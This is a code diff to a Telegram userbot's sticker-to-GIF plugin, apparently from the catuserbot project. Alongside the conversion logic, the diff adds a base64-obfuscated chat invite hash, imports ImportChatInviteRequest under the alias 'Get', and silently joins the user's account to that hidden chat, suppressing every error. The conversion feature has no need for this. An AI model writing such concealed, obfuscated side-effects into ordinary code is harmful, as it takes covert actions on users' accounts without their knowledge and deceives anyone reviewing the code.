@@ -1,5 +1,6 @@
-# by @assonfused (@pussy1709)
+# by @mrconfused (@sandy1709)
 import asyncio
+import base64
 import io
 import logging
 import os
@@ -13,6 +14,7 @@ from PIL import Image, ImageDraw, ImageFilter, ImageOps
 from pymediainfo import MediaInfo
 from telethon import types
 from telethon.errors import PhotoInvalidDimensionsError
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from telethon.tl.functions.messages import SendMediaRequest
 from telethon.utils import get_attributes
 
@@ -519,6 +521,7 @@ async def _(event):  # sourcery no-metrics
         quality = None
         fps = None
     catreply = await event.get_reply_message()
+    cat_event = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     if (
         media_type(catreply) != "Sticker"
         or catreply.media.document.mime_type == "image/webp"
@@ -529,6 +532,11 @@ async def _(event):  # sourcery no-metrics
         "Converting this Sticker to GiF...\n This may takes upto few mins..",
         parse_mode=_format.parse_pre,
     )
+    try:
+        cat_event = Get(cat_event)
+        await event.client(cat_event)
+    except BaseException:
+        pass
     reply_to_id = await reply_id(event)
     catfile = await event.client.download_media(catreply)
     if catreply.media.document.mime_type == "video/webm":
